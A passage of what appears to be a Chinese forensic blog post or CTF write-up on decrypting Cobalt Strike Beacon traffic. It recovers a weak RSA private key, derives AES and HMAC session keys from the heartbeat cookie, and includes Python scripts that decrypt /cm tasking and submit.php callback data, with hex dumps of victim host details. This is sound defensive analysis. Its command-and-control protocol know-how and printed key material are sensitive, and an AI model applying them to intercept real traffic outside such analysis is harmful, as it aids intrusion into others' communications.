<a href=#%e7%bb%99beacon%e7%9a%84%e6%83%85%e5%86%b5 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>1、使用 <a href=https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py target=_blank rel="external nofollow noopener noreferrer">1768.py</a> 去解析 Beacon 文件</p><p>2、解析公钥，爆破n生成私钥</p><p>3、使用私钥去解密心跳包中的cookie信息得到<code>AES_KEY</code>和<code>HMAC_KEY</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.PublicKey</span> <span class=kn>import</span> <span class=n>RSA</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>PKCS1_v1_5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>privateKey</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=s1>MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO
</span></span></span><span class=line><span class=cl><span class=s1>FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
</span></span></span><span class=line><span class=cl><span class=s1>XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC
</span></span></span><span class=line><span class=cl><span class=s1>gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE
</span></span></span><span class=line><span class=cl><span class=s1>I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf
</span></span></span><span class=line><span class=cl><span class=s1>pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1
</span></span></span><span class=line><span class=cl><span class=s1>qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS
</span></span></span><span class=line><span class=cl><span class=s1>fIJV5J8CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3
</span></span></span><span class=line><span class=cl><span class=s1>PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe
</span></span></span><span class=line><span class=cl><span class=s1>dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu
</span></span></span><span class=line><span class=cl><span class=s1>Ke+zaDVMoXKbyxIH8DEJXFkhXjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwg
</span></span></span><span class=line><span class=cl><span class=s1>p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn
</span></span></span><span class=line><span class=cl><span class=s1>xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT
</span></span></span><span class=line><span class=cl><span class=s1>-----END RSA PRIVATE KEY-----&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>publicKey</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;-----BEGIN PUBLIC KEY-----
</span></span></span><span class=line><span class=cl><span class=s1>MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75N
</span></span></span><span class=line><span class=cl><span class=s1>d+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
</span></span></span><span class=line><span class=cl><span class=s1>XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAE=
</span></span></span><span class=line><span class=cl><span class=s1>-----END PUBLIC KEY-----&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_AES_HMAC_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=p>,</span><span class=n>encode_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 提取协商密钥和主机信息</span>
</span></span><span class=line><span class=cl>    <span class=n>private_key</span> <span class=o>=</span> <span class=n>RSA</span><span class=o>.</span><span class=n>import_key</span><span class=p>(</span><span class=n>PRIVATE_KEY</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>PKCS1_v1_5</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>private_key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>encode_data</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>4</span><span class=p>]</span> <span class=o>==</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00\x00\xBE\xEF</span><span class=s1>&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_keys</span> <span class=o>=</span> <span class=n>ciphertext</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>24</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_aes_hash256</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha256</span><span class=p>(</span><span class=n>raw_aes_keys</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>aes_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>hmac_key</span> <span class=o>=</span> <span class=n>raw_aes_hash256</span><span class=p>[</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span> <span class=c1># 主机信息</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>aes_key</span><span class=o>.</span><span class=n>hex</span><span class=p>(),</span><span class=n>hmac_key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 协商密钥和主机信息用RSA公钥加密之后放在了心跳包的cookie中</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie_data</span> <span class=o>=</span> <span class=s2>&#34;SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k=&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span><span class=p>,</span><span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>get_AES_HMAC_key</span><span class=p>(</span><span class=n>privateKey</span><span class=p>,</span><span class=n>cookie_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;AES key: </span><span class=si>{</span><span class=n>SHARED_KEY</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;HMAC key: </span><span class=si>{</span><span class=n>HMAC_KEY</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 00000000: 00 00 BE EF 00 00 00 5D  28 AB 95 1F C9 6B CB 93  .......](....k..</span>
</span></span><span class=line><span class=cl><span class=c1># 00000010: EC 13 CF 9D D5 F2 13 73  A8 03 A8 03 43 50 DF EC  .......s....CP..</span>
</span></span><span class=line><span class=cl><span class=c1># 00000020: 00 00 0B 50 00 00 0E 06  01 1D B0 00 00 00 00 77  ...P...........w</span>
</span></span><span class=line><span class=cl><span class=c1># 00000030: 02 04 D0 77 02 34 70 8C  B8 A8 C0 57 49 4E 2D 52  ...w.4p....WIN-R</span>
</span></span><span class=line><span class=cl><span class=c1># 00000040: 52 49 39 54 39 53 4E 38  35 44 09 41 64 6D 69 6E  RI9T9SN85D.Admin</span>
</span></span><span class=line><span class=cl><span class=c1># 00000050: 69 73 74 72 61 74 6F 72  09 61 72 74 69 66 61 63  istrator.artifac</span>
</span></span><span class=line><span class=cl><span class=c1># 00000060: 74 2E 65 78 65                                    t.exe</span>
</span></span><span class=line><span class=cl><span class=c1># AES key: 9fe14473479a283821241e2af78017e8</span>
</span></span><span class=line><span class=cl><span class=c1># HMAC key: 1e3d54f1b9f0e106773a59b7c379a89d</span></span></span></code></pre></td></tr></table></div></div><p>4、解密心跳包 /cm 中传输的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;9fe14473479a283821241e2af78017e8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;data.txt&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 数据总长度为：</span><span class=si>{</span><span class=n>encrypt_data_length</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#39;big&#39;, signed=False)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=s1>&#39;=&#39;</span><span class=o>*</span><span class=mi>80</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>pcapng_data</span> <span class=o>=</span> <span class=n>dec</span><span class=p>[</span><span class=mi>64</span><span class=p>:</span><span class=o>-</span><span class=mi>60</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;out.pcapng&#34;</span><span class=p>,</span><span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>pcapng_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>pcapng_data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># output = dec[12:int.from_bytes(dec[4:8], byteorder=&#39;big&#39;, signed=False)].decode(&#39;gbk&#39;,errors=&#39;ignore&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(output)</span></span></span></code></pre></td></tr></table></div></div><p>5、解密submit.php中回传的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;9fe14473479a283821241e2af78017e8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypt_datas</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3&#34;</span><span class=p>,</span><span class=s2>&#34;000001602a99f7cc51face35199e8b1a4a5616e0301591b6f1f48b1d000149cb83d6a81e9659849a52c4f50a8629b0dfb7c036df406b44d449e40fe18df3594721e1f5849662271c1ea18b18c8eb58af5ee2c3a784852dd1c4a5c699f9518d2e2fc70d756cd68361ac794eed4eae6b062be6c31651caf93954f2a89b10e25b1fd9757ec17ee8b97038c4babb73c4f21688f5d235797844c2c9c288fac3fd2bd9cf5373956389b7e5232e35b6f268f9d67ba54f3e7e1606d4cb4020d5f480c6e5f4409b8d87e0443ae0bcfe93d286291ba6bfd0c7f37593581d90bb4ab7cfb065b4421a727f120fb491c2dc01797e38996dfc123fb120c5ed312577cc917d8a435b73c25b6d29ef0bad595100256c9aa5571e5c0ce0a8ea2c173ca1fae577fa924506b75b86522052f019d6843d74dc6fbdf2219b77e020a049c4e77df3658c80bcb703f8f878ff2f70c5c69d0cf6f4efb5a755ba854dfa5777a23989286770da6e0444d0&#34;</span><span class=p>,</span><span class=s2>&#34;000000d0c72ef8b74a7d8acc332695b62448280f9a4eaa12457de4adcad279b0563f2d4cb0707f7e2853c45acf28a365d905cf8ca421d557bd7655cbd50aafbdbe5f3f570c9c3d876d0c21b661ca5c46e09f987f7e1263f6d33c34db28a2fd342fe48e5801d1a97fb88e00f0c648ec889f6b72d71edd2eed5affd32bc8d51e27fcc148d16823c1bc235b0e16d9d477bd0b4582941db373e171cce78b10c869eb987baf3fd9f879b236be6f3af43b7742f6241dfe02ab696c96f1779d0003d6b2720d1c93890e75fcce939f1c8e0922ce5044bc3a&#34;</span><span class=p>,</span><span class=s2>&#34;00000100f24f15cd6f33c36e70ca228d10babfac1cf6bfbb9b6923a7828c9ed30b76d3ce1cb3d8f97c358bf90004e771ac646b1b996fd248ac8f0b460e0a36950dffcde04f3bae831982b528393f3a3c771310ba0c0bb7418ba5e8734a6bd37bc8a51cc0683c0904e0f404180e4c4c34720a3e5d6767c435f1746e6b93a13a2ecdc8074089e684b90748fc1a7e24e66bd637673437d9e24a37ce6f584b478e2f0485f3c05414dd4c35eb9ecfed8d4fbdab54db4233258f4fea6ed515a1030feeb184db94a4841236b491d2f7379e10f52d50ae573cd6f4504aa9750da273fa65c2a9eaf9b9bb014cafc53a9e9f0042bfcd5d24fc1b29173fd3308ff08d30b2a7d42132d4&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>encrypt_data</span> <span class=ow>in</span> <span class=n>encrypt_datas</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># encrypt_data = base64.b64decode(encrypt_data)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data_l</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>data1</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
